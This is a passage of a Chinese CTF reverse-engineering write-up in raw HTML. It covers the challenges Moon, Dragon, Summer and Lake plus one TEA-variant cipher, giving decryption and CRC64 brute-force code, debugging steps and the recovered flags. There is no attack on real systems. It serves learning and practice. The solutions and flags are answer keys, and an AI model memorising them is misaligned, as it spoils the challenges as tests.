class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint32_t</span> v0 <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> v1 <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> sum <span class=\"token operator\">=</span> <span class=\"token number\">0x5f5fe6e7</span> <span class=\"token operator\">*</span> <span class=\"token number\">72</span><span class=\"token punctuation\">,</span> delta <span class=\"token operator\">=</span> <span class=\"token number\">0x5f5fe6e7</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">72</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> tmp3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">^</span> <span class=\"token number\">0x55667788</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sum<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x23235566</span> <span class=\"token operator\">^</span> tmp3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v1 <span class=\"token operator\">-=</span> tmp4<span class=\"token punctuation\">;</span>\n        sum <span class=\"token operator\">-=</span> delta<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">>></span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">^</span> <span class=\"token number\">0x11223344</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>sum <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sum<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0xabab1212</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v0 <span class=\"token operator\">-=</span> tmp2<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v0<span class=\"token punctuation\">;</span>\n    v<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>提取chal程序中的密文，进行解密即可。</p>\n<p>完整解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">decipher</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint32_t</span> v0 <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> v1 <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> sum <span class=\"token operator\">=</span> <span class=\"token number\">0x5f5fe6e7</span> <span class=\"token operator\">*</span> <span class=\"token number\">72</span><span class=\"token punctuation\">,</span> delta <span class=\"token operator\">=</span> <span class=\"token number\">0x5f5fe6e7</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">72</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> tmp3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">^</span> <span class=\"token number\">0x55667788</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sum<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x23235566</span> <span class=\"token operator\">^</span> tmp3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v1 <span class=\"token operator\">-=</span> tmp4<span class=\"token punctuation\">;</span>\n        sum <span class=\"token operator\">-=</span> delta<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">>></span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">^</span> <span class=\"token number\">0x11223344</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>sum <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sum<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0xabab1212</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v0 <span class=\"token operator\">-=</span> tmp2<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v0<span class=\"token punctuation\">;</span>\n    v<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x776f6853</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x656b616d</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x616d5f72</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x74696564</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> Encflag<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x696C2E9A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76ADE8E1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE67D5CA4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C76BD38</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xB7AC0787</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBFEA0C65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01C2FF10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D16FD38</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">decipher</span><span class=\"token punctuation\">(</span>Encflag<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">decipher</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint64_t</span><span class=\"token punctuation\">)</span>Encflag <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">decipher</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint64_t</span><span class=\"token punctuation\">)</span>Encflag <span class=\"token operator\">+</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">decipher</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint64_t</span><span class=\"token punctuation\">)</span>Encflag <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.32s\\n\"</span><span class=\"token punctuation\">,</span> Encflag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>XYCTF{fun_un1c0rn_with_4rm64_VM}</p>\n<h3 id=\"Moon\"><a href=\"#Moon\" class=\"headerlink\" title=\"Moon\"></a>Moon</h3><p>跟到moon.xor_crypt实际加密处。</p>\n<p><img src=\"/images/6-1744626745337-11.png\"></p>\n<p>发现是进行了单次xor，并加入到一个list中，前后过程不清楚。</p>\n<p>断在xor这个命令，运行附加调试，随便输入一串1</p>\n<p><img src=\"/images/7-1744626745337-12.png\"></p>\n<p><img src=\"/images/8-1744626745338-15.png\"></p>\n<p>发现是输入的’1’和一个0x24进行xor，多运行几次发现就是将输入的字符串都异或上一些值。</p>\n<p>直接断在return处，v20是最后将list转成Bytes的结果。</p>\n<p><img src=\"/images/9-1744626745338-13.png\"></p>\n<p>发现是28长度的一串字节，从0x15开始的，就是我们输入字符串长度以及异或完的结果。</p>\n<p><img src=\"/images/10-1744626745338-14.png\"></p>\n<p>继续运行会返回到check_flag代码处，底下有一个RichCompare比较两个数据。</p>\n<p><img src=\"/images/11-1744626745338-16.png\"></p>\n<p>v45可以看到就是将刚刚v20的bytes直接unhex转成了一串字符串。</p>\n<p><img src=\"/images/12-1744626745338-18.png\"></p>\n<p>那么v9就应该是flag的密文，可以数出一共是要35字节。</p>\n<p><img src=\"/images/13-1744626745338-17.png\"></p>\n<p>重新调试运行输入35个1，在check_flag开头断点，把输入的字符串全都patch成0。</p>\n<p><img src=\"/images/14-1744626745338-19.png\"></p>\n<p><img src=\"/images/15-1744626745338-20.png\"></p>\n<p><img src=\"/images/16-1744626745338-21.png\"></p>\n<p>最后在RichCompare处就可以得到xor密文的列表。</p>\n<p><img src=\"/images/17-1744626745338-22.png\"></p>\n<p>将v9的密文与这个数据进行xor即可得到flag。</p>\n<p><img src=\"/images/18-1744626745338-23.png\"></p>\n<p>flag{but_y0u_l00k3d_up_@t_th3_mOOn}</p>\n<h3 id=\"Dragon\"><a href=\"#Dragon\" class=\"headerlink\" title=\"Dragon\"></a>Dragon</h3><p>.bc 后缀 </p>\n<p>反编译为LLVM IR</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">llvm<span class=\"token operator\">-</span>dis<span class=\"token operator\">-</span><span class=\"token number\">17</span> Dragon<span class=\"token punctuation\">.</span>bc <span class=\"token operator\">-</span>o Dragon<span class=\"token punctuation\">.</span>ll</code></pre>\n\n<p>分析得知为crc64，以两个为一组进行校验，直接爆破就行</p>\n<pre class=\"language-c++\" data-language=\"c++\"><code class=\"language-c++\">#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;string.h&gt;\n\nuint64_t calculate_crc64_direct(const unsigned char* data, uint64_t length) &#123;\n    uint64_t crc &#x3D; 0xFFFFFFFFFFFFFFFFULL; \n\n    for (uint64_t i &#x3D; 0; i &lt; length; i++) &#123;\n        crc ^&#x3D; ((uint64_t)data[i] &lt;&lt; 56);\n\n        for (uint64_t j &#x3D; 0; j &lt; 8; j++) &#123;\n            if (crc &amp; 0x8000000000000000ULL) &#123; \n                crc &#x3D; (crc &lt;&lt; 1) ^ 0x42F0E1EBA9EA3693ULL; \n            &#125;\n            else &#123;\n                crc &#x3D; crc &lt;&lt; 1;\n            &#125;\n        &#125;\n    &#125;\n\n    return ~crc;\n&#125;\n\nint main() &#123;\n    uint64_t enc[12] &#x3D; &#123;\n       -2565957437423125689, \n        224890624719110086, \n        1357324823849588894, \n        - 8941695979231947288, \n        - 253413330424273460, \n        - 7817463785137710741, \n        - 5620500441869335673, \n        984060876288820705, \n        - 6993555743080142153, \n        - 7892488171899690683, \n        7190415315123037707, \n        - 7218240302740981077\n    &#125;;\n    char flag[25] &#x3D; &#123; 0 &#125;;\n    int flag_index &#x3D; 0;\n\n\n    for (int k &#x3D; 0; k &lt; 12; k++) &#123;\n        uint64_t target_crc &#x3D; enc[k];\n        int found &#x3D; 0;\n        for (unsigned char c1 &#x3D; 32; c1 &lt; 127 &amp;&amp; !found; c1++) &#123;\n            for (unsigned char c2 &#x3D; 32; c2 &lt; 127 &amp;&amp; !found; c2++) &#123;\n                unsigned char test[2] &#x3D; &#123; c1, c2 &#125;;\n                uint64_t crc &#x3D; calculate_crc64_direct(test, 2);\n                if (crc &#x3D;&#x3D; target_crc) &#123;\n                    flag[flag_index++] &#x3D; c1;\n                    flag[flag_index++] &#x3D; c2;\n                    break;\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n\n    flag[flag_index] &#x3D; &#39;\\0&#39;;\n    printf(&quot;Decrypted flag: %s\\n&quot;, flag);\n\n    return 0;\n&#125;\n&#x2F;&#x2F;flag&#123;LLVM_1s_Fun_Ri9h7?&#125;</code></pre>\n\n<h3 id=\"Summer\"><a href=\"#Summer\" class=\"headerlink\" title=\"Summer\"></a>Summer</h3><p>haskell程序</p>\n<p>函数式编程语言,这意味着一切都是惰性计算，什么是惰性计算？ 简单来说就是在调用之前不会对该值进行计算</p>\n<p>浏览 main 函数，可以看到 hs_main 将 ZCMain_main_closure 作为它的参数，它指向 haskell 程序的真正入口点</p>\n<p><img src=\"/images/31-1744626745338-24.png\"></p>\n<p>ZCMain_main_closure里面我们发现它调用了stg_ap_p_fast，这个是底层函数，主要调用Main_main_closure这个函数</p>\n<p><img src=\"/images/19-1744626745338-25.png\"></p>\n<p>GHCziInternalziBase也是底层函数，主要关注两个参数</p>\n<p><img src=\"/images/20-1744626745338-26.png\"></p>\n<p>第一个参数的地址处的函数为打印字符串</p>\n<p><img src=\"/images/21-1744626745338-27.png\"></p>\n<p><img src=\"/images/22-1744626745338-28.png\"></p>\n<p>GHCziInternalziList_length 为处理我们的传入的字符串的长度，直接调用的是zdwlenAcc<strong>，</strong>zdwlenAcc 将通过检查下一个是否是列表的末尾来计算 “flagTable” 的长度（这里的”flagTable” 是我自己命名,其实就是存储惰性列表，我们可以根据惰性列表的指针数判断字符串的长度）</p>\n<p><img src=\"/images/23-1744626745338-29.png\"></p>\n<p><img src=\"/images/24-1744626745338-30.png\"></p>\n<p>我们这里就用flag进行测试，一方面是为了查看他的返回值</p>\n<p><img src=\"/images/25-1744626745338-31.png\"></p>\n<p>此时他是将rbx此处(即为惰性列表的末尾)，可以人工数(即为50)</p>\n<p><img src=\"/images/26-1744626745338-32.png\"></p>\n<p>另外一种为看返回值，第一次断下是返回我们输入字符串的长度，第二次断下是返回密钥的长度，第三次断下是返回密文的长度</p>\n<p><img src=\"/images/27-1744626745338-33.png\"></p>\n<p><img src=\"/images/28-1744626745338-34.png\"></p>\n<p><img src=\"/images/29-1744626745338-35.png\"></p>\n<p>另外一处为GHCziInternalziNum_zdfNumIntzuzdczp，这个也是在网上一篇文章看到的,在<strong>add     rbx, [rax]</strong> 在经过几次迭代后，我可以看到一些字符开始出现，此时我们可以得到密钥为<strong>Klingsor’s_Last_Summer</strong></p>\n<p><img src=\"/images/30-1744626745338-36.png\"></p>\n<p>我们在.data段得到了密钥，因此我们可以猜测下面可能为密文,并且下面都是指针+元素的存储形式</p>\n<p><img src=\"/images/32-1744626745338-37.png\"></p>\n<p><img src=\"/images/33-1744626745338-38.png\"></p>\n<p>然后通过CE调试得到明文和密文，然后得出为rc4+xor</p>\n<p><img src=\"/images/34-1744626745338-39.png\"></p>\n<p><img src=\"/images/35-1744626745338-40.png\"></p>\n<p>flag{Us3_H@sk3ll_t0_f1nd_th3_truth_1n_th1s_Summ3R}</p>\n<h3 id=\"Lake\"><a href=\"#Lake\" class=\"headerlink\" title=\"Lake\"></a>Lake</h3><p>单步跟到主函数。</p>\n<p><img src=\"/images/36-1744626745338-41.png\"></p>\n<p>这边输入字符串后先赋值到了另一个数组，然后进行了一次简易VM计算进行了第一次加密，</p>\n<p><img src=\"/images/37-1744626745338-42.png\"></p>\n<p>然后接着第二次加密，最后循环比较。</p>\n<p><img src=\"/images/38-1744626745338-44.png\"></p>\n<p><img src=\"/images/39-1744626745338-43.png\"></p>\n<p>发现VM只用到了加减和XOR计算，在这三个地方的关键点打断点，输出寄存器和计算流程，这边为了方便直接复制到代码里面解密，将加减断点里面的输出运算符反过来，输出出来的代码直接复制到代码就是进行解密的流程。</p>\n<p><img src=\"/images/40-1744626745338-45.png\"></p>\n<p><img src=\"/images/41-1744626745338-46.png\"></p>\n<p><img src=\"/images/42-1744626745338-48.png\"></p>\n<p>调试输出：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\">Input<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">85</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">35</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">9</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">37</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">13</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">15</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">34</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">39</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">126</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">34</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">11</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">9</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">34</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">52</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">38</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">119</span><span class=\"token 